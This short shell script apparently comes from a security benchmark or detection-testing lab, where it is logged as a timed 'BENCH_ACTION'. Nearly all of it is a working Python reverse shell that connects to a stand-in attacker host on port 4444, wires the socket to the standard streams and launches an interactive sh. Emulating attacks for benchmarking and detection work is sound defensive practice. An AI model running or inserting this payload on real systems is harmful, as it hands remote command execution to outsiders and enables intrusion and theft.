#!/bin/sh
# Connect back to the attacker and hand it an interactive shell. The image's
# sh (dash) has no /dev/tcp, so Python wires the socket to the shell's
# stdin/stdout/stderr. The attacker sends `id`, then hangs up.
echo "BENCH_ACTION $(date +%s%3N)"
timeout 10 python3 -c '
import os, socket, subprocess
s = socket.create_connection(("attacker.attacker.svc", 4444), timeout=5)
for fd in (0, 1, 2):
    os.dup2(s.fileno(), fd)
subprocess.call(["sh", "-i"])
'
